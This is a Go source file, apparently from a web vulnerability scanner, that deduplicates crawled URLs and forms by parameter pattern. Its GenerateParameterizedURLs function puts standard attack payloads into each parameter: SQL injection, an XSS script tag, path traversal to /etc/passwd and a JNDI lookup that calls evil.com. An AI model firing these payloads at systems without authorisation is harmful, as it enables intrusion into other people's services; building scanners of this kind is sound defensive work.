package core

import (
	"fmt"
	"net/url"
	"sort"
	"strconv"
	"strings"
	"sync"
)

// URLPattern URL模式结构
type URLPattern struct {
	Scheme     string            // http/https
	Host       string            // 主机名
	Path       string            // 路径
	ParamNames []string          // 参数名列表
	Pattern    string            // 模式字符串，如 "/page?id={value}&type={value}"
	Examples   []string          // 示例URL列表
	Values     map[string][]string // 每个参数对应的值列表
	Count      int               // 发现的URL数量
}

// FormPattern 表单模式结构
type FormPattern struct {
	Action     string            // 表单action（去除参数值）
	Method     string            // 请求方法
	Fields     []FormField       // 字段列表
	Pattern    string            // 表单模式字符串
	Examples   []Form            // 示例表单列表
	Count      int               // 发现的表单数量
}

// SmartDeduplication 智能去重处理器
type SmartDeduplication struct {
	mutex        sync.Mutex
	urlPatterns  map[string]*URLPattern  // URL模式映射
	formPatterns map[string]*FormPattern // 表单模式映射
	seenURLs     map[string]bool         // 已见过的URL
	seenForms    map[string]bool         // 已见过的表单
}

// NewSmartDeduplication 创建智能去重处理器
func NewSmartDeduplication() *SmartDeduplication {
	return &SmartDeduplication{
		urlPatterns:  make(map[string]*URLPattern),
		formPatterns: make(map[string]*FormPattern),
		seenURLs:     make(map[string]bool),
		seenForms:    make(map[string]bool),
	}
}

// ProcessURL 处理URL，进行智能去重
func (sd *SmartDeduplication) ProcessURL(rawURL string) bool {
	sd.mutex.Lock()
	defer sd.mutex.Unlock()
	
	// 检查是否已经处理过这个确切的URL
	if sd.seenURLs[rawURL] {
		return false // 已存在，跳过
	}
	
	// 解析URL
	parsedURL, err := url.Parse(rawURL)
	if err != nil {
		return true // 解析失败，保留原URL
	}
	
	// 生成URL模式
	pattern := sd.generateURLPattern(parsedURL)
	patternKey := pattern.Pattern
	
	// 检查是否已有相同模式
	if existing, exists := sd.urlPatterns[patternKey]; exists {
		// 相同模式，合并信息
		existing.Examples = append(existing.Examples, rawURL)
		existing.Count++
		
		// 合并参数值
		for paramName, values := range pattern.Values {
			if existing.Values[paramName] == nil {
				existing.Values[paramName] = make([]string, 0)
			}
			for _, value := range values {
				if !containsString(existing.Values[paramName], value) {
					existing.Values[paramName] = append(existing.Values[paramName], value)
				}
			}
		}
		
		sd.seenURLs[rawURL] = true
		return false // 模式已存在，不需要添加新URL
	}
	
	// 新模式，添加到映射中
	pattern.Examples = []string{rawURL}
	pattern.Count = 1
	sd.urlPatterns[patternKey] = pattern
	sd.seenURLs[rawURL] = true
	
	return true // 新模式，需要添加
}

// ProcessForm 处理表单，进行智能去重
func (sd *SmartDeduplication) ProcessForm(form Form) bool {
	sd.mutex.Lock()
	defer sd.mutex.Unlock()
	
	// 生成表单模式
	pattern := sd.generateFormPattern(form)
	patternKey := pattern.Pattern
	
	// 检查是否已有相同模式
	if existing, exists := sd.formPatterns[patternKey]; exists {
		// 相同模式，合并信息
		existing.Examples = append(existing.Examples, form)
		existing.Count++
		sd.seenForms[patternKey] = true
		return false // 模式已存在，不需要添加新表单
	}
	
	// 新模式，添加到映射中
	pattern.Examples = []Form{form}
	pattern.Count = 1
	sd.formPatterns[patternKey] = pattern
	sd.seenForms[patternKey] = true
	
	return true // 新模式，需要添加
}

// generateURLPattern 生成URL模式
func (sd *SmartDeduplication) generateURLPattern(parsedURL *url.URL) *URLPattern {
	pattern := &URLPattern{
		Scheme:     parsedURL.Scheme,
		Host:       parsedURL.Host,
		Path:       parsedURL.Path,
		ParamNames: make([]string, 0),
		Values:     make(map[string][]string),
	}
	
	// 处理查询参数
	params := parsedURL.Query()
	if len(params) > 0 {
		paramParts := make([]string, 0)
		
		// 按参数名排序确保一致性
		keys := make([]string, 0, len(params))
		for k := range params {
			keys = append(keys, k)
		}
		sort.Strings(keys)
		
		for _, paramName := range keys {
			values := params[paramName]
			pattern.ParamNames = append(pattern.ParamNames, paramName)
			pattern.Values[paramName] = values
			
			// 检查值是否为数字序列
			if sd.isNumericSequence(values) {
				paramParts = append(paramParts, fmt.Sprintf("%s={num}", paramName))
			} else if len(values) == 1 {
				paramParts = append(paramParts, fmt.Sprintf("%s={value}", paramName))
			} else {
				paramParts = append(paramParts, fmt.Sprintf("%s={multi}", paramName))
			}
		}
		
		pattern.Pattern = fmt.Sprintf("%s://%s%s?%s", 
			pattern.Scheme, pattern.Host, pattern.Path, strings.Join(paramParts, "&"))
	} else {
		pattern.Pattern = fmt.Sprintf("%s://%s%s", 
			pattern.Scheme, pattern.Host, pattern.Path)
	}
	
	return pattern
}

// generateFormPattern 生成表单模式
func (sd *SmartDeduplication) generateFormPattern(form Form) *FormPattern {
	pattern := &FormPattern{
		Method: strings.ToUpper(form.Method),
		Fields: form.Fields,
	}
	
	// 规范化Action（移除参数值，只保留结构）
	if form.Action != "" {
		parsedURL, err := url.Parse(form.Action)
		if err == nil {
			actionPattern := parsedURL.Path
			
			// 处理查询参数，替换值为占位符
			params := parsedURL.Query()
			if len(params) > 0 {
				paramParts := make([]string, 0)
				keys := make([]string, 0, len(params))
				for k := range params {
					keys = append(keys, k)
				}
				sort.Strings(keys)
				
				for _, paramName := range keys {
					paramParts = append(paramParts, fmt.Sprintf("%s={value}", paramName))
				}
				actionPattern += "?" + strings.Join(paramParts, "&")
			}
			pattern.Action = actionPattern
		} else {
			pattern.Action = form.Action
		}
	}
	
	// 生成字段模式
	fieldParts := make([]string, 0)
	for _, field := range form.Fields {
		if field.Name != "" {
			fieldParts = append(fieldParts, fmt.Sprintf("%s:%s", field.Name, field.Type))
		}
	}
	
	pattern.Pattern = fmt.Sprintf("%s:%s[%s]", 
		pattern.Method, pattern.Action, strings.Join(fieldParts, ","))
	
	return pattern
}

// isNumericSequence 检查值列表是否为数字序列
func (sd *SmartDeduplication) isNumericSequence(values []string) bool {
	if len(values) < 2 {
		return false
	}
	
	numbers := make([]int, 0, len(values))
	for _, value := range values {
		if num, err := strconv.Atoi(value); err == nil {
			numbers = append(numbers, num)
		} else {
			return false
		}
	}
	
	// 检查是否为连续序列或有规律的序列
	sort.Ints(numbers)
	isConsecutive := true
	for i := 1; i < len(numbers); i++ {
		if numbers[i] != numbers[i-1]+1 {
			isConsecutive = false
			break
		}
	}
	
	return isConsecutive || len(numbers) >= 3 // 连续序列或至少3个数字
}

// GetUniqueURLs 获取去重后的URL列表
func (sd *SmartDeduplication) GetUniqueURLs() []*URLPattern {
	sd.mutex.Lock()
	defer sd.mutex.Unlock()
	
	patterns := make([]*URLPattern, 0, len(sd.urlPatterns))
	for _, pattern := range sd.urlPatterns {
		patterns = append(patterns, pattern)
	}
	
	// 按发现数量排序
	sort.Slice(patterns, func(i, j int) bool {
		return patterns[i].Count > patterns[j].Count
	})
	
	return patterns
}

// GetUniqueForms 获取去重后的表单列表
func (sd *SmartDeduplication) GetUniqueForms() []*FormPattern {
	sd.mutex.Lock()
	defer sd.mutex.Unlock()
	
	patterns := make([]*FormPattern, 0, len(sd.formPatterns))
	for _, pattern := range sd.formPatterns {
		patterns = append(patterns, pattern)
	}
	
	// 按发现数量排序
	sort.Slice(patterns, func(i, j int) bool {
		return patterns[i].Count > patterns[j].Count
	})
	
	return patterns
}

// GetDeduplicationStats 获取去重统计信息
func (sd *SmartDeduplication) GetDeduplicationStats() map[string]interface{} {
	sd.mutex.Lock()
	defer sd.mutex.Unlock()
	
	stats := make(map[string]interface{})
	stats["total_unique_url_patterns"] = len(sd.urlPatterns)
	stats["total_unique_form_patterns"] = len(sd.formPatterns)
	stats["total_processed_urls"] = len(sd.seenURLs)
	stats["total_processed_forms"] = len(sd.seenForms)
	
	// 计算去重效果
	totalURLInstances := 0
	for _, pattern := range sd.urlPatterns {
		totalURLInstances += pattern.Count
	}
	
	totalFormInstances := 0
	for _, pattern := range sd.formPatterns {
		totalFormInstances += pattern.Count
	}
	
	stats["total_url_instances"] = totalURLInstances
	stats["total_form_instances"] = totalFormInstances
	
	if totalURLInstances > 0 {
		stats["url_deduplication_rate"] = float64(len(sd.urlPatterns)) / float64(totalURLInstances)
	}
	
	if totalFormInstances > 0 {
		stats["form_deduplication_rate"] = float64(len(sd.formPatterns)) / float64(totalFormInstances)
	}
	
	return stats
}

// GenerateParameterizedURLs 为URL模式生成参数化测试URL
func (sd *SmartDeduplication) GenerateParameterizedURLs(pattern *URLPattern) []string {
	testURLs := make([]string, 0)
	
	if len(pattern.Examples) == 0 {
		return testURLs
	}
	
	// 使用第一个示例作为基础
	baseURL := pattern.Examples[0]
	parsedURL, err := url.Parse(baseURL)
	if err != nil {
		return testURLs
	}
	
	// 为每个参数生成测试变体
	for paramName, values := range pattern.Values {
		if len(values) > 0 {
			// 使用第一个值作为基础，生成安全测试变体
			testPayloads := []string{
				"1' OR '1'='1", // SQL注入
				"<script>alert(1)</script>", // XSS
				"../../../etc/passwd", // 文件包含
				"${jndi:ldap://evil.com/}", // 日志注入
				"' UNION SELECT 1,2,3--", // SQL注入变体
			}
			
			for _, payload := range testPayloads {
				params := parsedURL.Query()
				params.Set(paramName, payload)
				newURL := parsedURL
				newURL.RawQuery = params.Encode()
				testURLs = append(testURLs, newURL.String())
			}
		}
	}
	
	return testURLs
}

// FormatPatternSummary 格式化模式摘要
func (sd *SmartDeduplication) FormatPatternSummary(pattern *URLPattern) string {
	summary := fmt.Sprintf("模式: %s", pattern.Pattern)
	
	if pattern.Count > 1 {
		summary += fmt.Sprintf(" (发现 %d 个实例)", pattern.Count)
	}
	
	// 显示参数值范围
	if len(pattern.Values) > 0 {
		valueInfo := make([]string, 0)
		for paramName, values := range pattern.Values {
			if len(values) <= 3 {
				valueInfo = append(valueInfo, fmt.Sprintf("%s=[%s]", paramName, strings.Join(values, ",")))
			} else {
				valueInfo = append(valueInfo, fmt.Sprintf("%s=[%s...%s]共%d个值", 
					paramName, values[0], values[len(values)-1], len(values)))
			}
		}
		summary += fmt.Sprintf(" 参数范围: %s", strings.Join(valueInfo, ", "))
	}
	
	return summary
}

// containsString 检查slice中是否包含指定元素
func containsString(slice []string, item string) bool {
	for _, s := range slice {
		if s == item {
			return true
		}
	}
	return false
}
